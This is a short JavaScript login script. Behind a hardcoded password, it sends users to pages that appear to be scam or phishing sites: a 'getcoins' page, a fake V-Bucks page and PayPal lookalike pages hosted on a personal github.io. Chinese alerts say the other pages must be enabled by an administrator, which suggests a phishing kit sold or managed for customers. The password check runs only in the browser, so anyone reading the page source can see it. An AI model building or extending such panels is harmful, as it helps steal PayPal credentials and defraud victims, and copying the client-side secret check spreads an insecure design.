const loginForm = document.getElementById('loginForm');

loginForm.addEventListener('submit', function (e) {
    e.preventDefault();
    const password = document.getElementById('password').value;
    const version = document.querySelector('input[name="option"]:checked').value;

    if (password === '172839') {
        if (version === 'version1' || version === null) {
            window.location.href = './pages/getcoins2.html';
        } else if (version === 'version2'){
          //  window.location.href = './pages/getcoins.html';
            alert('网页未开通，请联系管理员开通网页！')
        } else if (version === 'vcoins'){
           // window.location.href = 'https://jongaha.github.io/vBucks/';
            alert('网页未开通，请联系管理员开通网页！')
        } else if (version === 'paypal'){
            window.location.href = 'https://jongaha.github.io/PayPal/';
            // alert('网页未开通，请联系管理员开通网页！')
        } else if (version === 'paypal_mobile'){
          //  window.location.href = 'https://jongaha.github.io/paypal_m/';
            alert('网页未开通，请联系管理员开通网页！')
        }
    } else {
        alert('Wrong password. Please try again.');
    }
});
